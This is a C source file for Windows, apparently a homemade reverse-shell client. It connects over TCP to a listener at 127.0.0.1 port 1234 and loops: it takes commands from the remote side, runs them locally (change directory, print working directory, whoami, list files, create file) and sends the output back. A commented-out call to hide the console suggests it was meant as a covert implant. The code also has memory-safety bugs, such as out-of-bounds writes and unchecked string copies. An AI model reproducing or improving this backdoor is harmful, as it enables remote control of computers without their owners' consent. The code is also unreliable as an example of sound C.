#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#pragma comment(lib,"ws2_32.lib")

char buff[1024];

void pwd(){
    DWORD buf_len = 50;  
    char val[50];
    GetCurrentDirectory(buf_len,val);
    strcpy(buff,val);
    printf("%s\n",buff);
}
//Dont use createfile as name of function cause same as windows built-in function
void fcreate(char my[]){
    char *arr;
    const char *arr1;
    arr = strtok(my," ");
    int count = 1;
    while(count--){
        arr = strtok(NULL," ");
    }                                                           // all this to make char * to  const char * what a mess ...
    // arr1 = (const char *)arr;
    LPCSTR Filename ;
    // strcpy(Filename,arr);
    Filename = (const char *)arr;
    HANDLE filehandler ;
    filehandler = CreateFileA(Filename,GENERIC_READ | GENERIC_WRITE,2,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(filehandler == INVALID_HANDLE_VALUE){
        strcpy(buff,"cant create file .");
        printf("cant create file\n");
    }
    // FILE *fptr;
    // fptr = fopen(arr,"w");
    // fclose(fptr);
}
void changedirectory(char *my){
    char arr[strlen(my)];
    int i;
    for( i=3;i<strlen(my);i++)
        arr[i-3] = my[i];
    arr[i] = '\0';
    SetCurrentDirectory(arr);
    pwd();
}

void whoami(){
    char username[MAX_PATH];
    DWORD user_len = MAX_PATH;
    GetUserName(username,&user_len);
    strcpy(buff,username);
    printf("%s\n",buff);
}
void ls(){
    pwd();
    char buff1[790];
    sprintf(buff1,"%s\\*.*",buff);
    ZeroMemory(buff,sizeof(buff));
    strcpy(buff,buff1);
    WIN32_FIND_DATA data;
    printf("%s",buff);
    HANDLE find = FindFirstFile(buff,&data);
    if(find == INVALID_HANDLE_VALUE){
        strcpy(buff1,"error in firstfindfile");
    }
    do{
        if(data.dwFileAttributes && FILE_ATTRIBUTE_DIRECTORY){
            strcat(buff1,"\n");
            strcat(buff1,data.cFileName);
        }
        else{
            //this part doesn't execute GOD KNOWS !!!
            printf("%s",data.cFileName);
            sprintf(buff1,"<file> %s",data.cFileName);
            strcat(buff1,data.cFileName);
            strcat(buff1,"\n");
        }
    }while(FindNextFile(find,&data));
    strcpy(buff,buff1);
}
void shell(char my[]){
    char *arr,b1[strlen(my)+1];
    strcpy(b1,my);
    arr = strtok(b1," ");
    printf("the first word is %s \n",arr);
    if(strcmp(arr,"cd") == 0){
        changedirectory(my);
    }
    else if(strcmp(my,"whoami")==0){
        whoami();
    }
    else if(strcmp(my,"pwd") == 0){
        pwd();
    }else if(strcmp(my,"ls") == 0){
        ls();
    }
    else if(strcmp(arr,"create") == 0){
        fcreate(my);
    }
    else
        printf("no cmd found ...\n");
}
int main(){
    // FreeConsole();
    WSADATA wsd;
    int res = WSAStartup(MAKEWORD(2,2),&wsd);
    if(res == SOCKET_ERROR){
        printf("WSASTARTUP ERROR ... ");
        WSACleanup();
        exit(0);
    }
    //Creating socket
    SOCKET s;
    s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(s == SOCKET_ERROR){
        printf("socket creation err ... ");
        WSACleanup();
        exit(0);
    }
    SOCKADDR_IN serv;
    serv.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv.sin_family = AF_INET;
    serv.sin_port = htons(1234);

    if(connect(s,(SOCKADDR *)&serv,sizeof(serv)) == SOCKET_ERROR ){
        printf("connection err ... ");
        WSACleanup();
        exit(0);
    }
    while(1){
        int b ;
        char my[1024];
        b = recv(s,buff,1024,0);
        printf("recv data :\t\t\t\t %s\n",buff);
        strcpy(my,buff);
        ZeroMemory(buff,sizeof(buff));
        shell(my);
        send(s,buff,strlen(buff)+1,0);
        ZeroMemory(my,sizeof(my));
        ZeroMemory(buff,sizeof(buff));
    }
    closesocket(s);
    return 0;
}